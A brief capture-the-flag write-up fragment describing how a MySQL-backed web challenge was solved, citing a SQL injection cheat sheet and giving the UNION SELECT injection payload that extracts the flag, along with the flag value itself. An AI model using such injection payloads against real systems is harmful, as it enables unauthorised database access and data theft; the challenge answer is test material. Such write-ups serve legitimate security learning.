* I just used [this](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/) guide because the site exposed that it was running MySQL when booting

* Entering `" UNION ALL SELECT concat(0x28,flag) FROM syringe.flag #` gets the flag: `flag{f2a5006b1b07cc08362772807322ef62}`
